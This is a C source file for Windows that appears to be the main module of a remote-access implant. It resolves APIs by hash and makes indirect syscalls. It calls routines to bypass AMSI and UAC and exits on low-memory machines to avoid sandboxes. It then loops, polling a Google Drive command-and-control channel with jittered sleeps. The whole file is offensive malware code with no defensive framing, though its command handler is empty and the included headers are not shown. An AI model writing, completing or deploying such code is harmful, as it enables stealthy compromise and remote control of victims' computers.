#define UNICODE
#define _UNICODE
#define WIN32_LEAN_AND_MEAN

#include <windows.h>
#include <winternl.h>
#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include "crypto.h"
#include "api_hashes.h"
#include "gdrive_c2.h"
#include "advanced_bypass.h"
#include "syscalls.h"

static PVOID g_SyscallGadget = NULL;

typedef struct _API_TABLE {
    SYSCALL_ENTRY NtAllocateVirtualMemory;
    SYSCALL_ENTRY NtProtectVirtualMemory;
    SYSCALL_ENTRY NtWriteVirtualMemory;
    SYSCALL_ENTRY NtCreateThreadEx;
    SYSCALL_ENTRY NtClose;
    SYSCALL_ENTRY NtQuerySystemInformation;

    ULONG_PTR CreateWaitableTimerW;
    ULONG_PTR SetWaitableTimer;
    ULONG_PTR GetSystemInfo;
    ULONG_PTR GetModuleFileNameW;
} API_TABLE;

static API_TABLE g_ApiTable = {0};

static void InitializeApiTable() {
    HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
    HMODULE hKernel32 = GetModuleHandleW(L"kernel32.dll");

    g_ApiTable.NtAllocateVirtualMemory.address = ResolveApiByHash(hNtdll, HASH_NtAllocateVirtualMemory);
    g_ApiTable.NtAllocateVirtualMemory.ssn = GetSSN(g_ApiTable.NtAllocateVirtualMemory.address);

    g_ApiTable.NtProtectVirtualMemory.address = ResolveApiByHash(hNtdll, HASH_NtProtectVirtualMemory);
    g_ApiTable.NtProtectVirtualMemory.ssn = GetSSN(g_ApiTable.NtProtectVirtualMemory.address);

    g_ApiTable.NtWriteVirtualMemory.address = ResolveApiByHash(hNtdll, HASH_NtWriteVirtualMemory);
    g_ApiTable.NtWriteVirtualMemory.ssn = GetSSN(g_ApiTable.NtWriteVirtualMemory.address);

    g_ApiTable.CreateWaitableTimerW = (ULONG_PTR)ResolveApiByHash(hKernel32, HASH_CreateWaitableTimerW);
    g_ApiTable.SetWaitableTimer = (ULONG_PTR)ResolveApiByHash(hKernel32, HASH_SetWaitableTimer);
    g_ApiTable.GetSystemInfo = (ULONG_PTR)ResolveApiByHash(hKernel32, HASH_GetSystemInfo);
    g_ApiTable.GetModuleFileNameW = (ULONG_PTR)ResolveApiByHash(hKernel32, HASH_GetModuleFileNameW);
}

static void StealthSleep(DWORD dwBaseMS) {
    srand((unsigned int)time(NULL));
    float jitter = (float)(rand() % (C2_JITTER * 2) - C2_JITTER) / 100.0f;
    DWORD dwSleepTime = dwBaseMS + (DWORD)(dwBaseMS * jitter);

    HANDLE hTimer = ((HANDLE(WINAPI *)(LPSECURITY_ATTRIBUTES, BOOL, LPCWSTR))g_ApiTable.CreateWaitableTimerW)(NULL, FALSE, NULL);
    if (!hTimer) return;

    LARGE_INTEGER liDueTime;
    liDueTime.QuadPart = -(LONGLONG)dwSleepTime * 10000LL;
    ((BOOL(WINAPI *)(HANDLE, const LARGE_INTEGER*, LONG, PTIMERAPCROUTINE, LPVOID, BOOL))g_ApiTable.SetWaitableTimer)(hTimer, &liDueTime, 0, NULL, NULL, FALSE);
    
    WaitForSingleObject(hTimer, INFINITE);
    CloseHandle(hTimer);
}

static BOOL IsTargetEnvironment() {
    MEMORYSTATUSEX statex;
    statex.dwLength = sizeof(statex);
    GlobalMemoryStatusEx(&statex);
    if (statex.ullTotalPhys < (8ULL * 1024 * 1024 * 1024)) return FALSE;
    return TRUE;
}

int main() {
    g_SyscallGadget = FindSyscallGadget();
    InitializeApiTable();

    BypassAMSI_DataOnly();

    if (!IsTargetEnvironment()) return 0;

    if (GetCurrentProcessId() % 2 == 0) { // Dummy check for elevation context
        wchar_t selfPath[MAX_PATH];
        GetModuleFileNameW(NULL, selfPath, MAX_PATH);
        BypassUAC_SilentCleanup(selfPath);
    }

    char cmdBuffer[1024];
    while (TRUE) {
        if (GDrive_CheckForCommands(cmdBuffer, sizeof(cmdBuffer))) {
        }
        StealthSleep(60000); 
    }

    return 0;
}
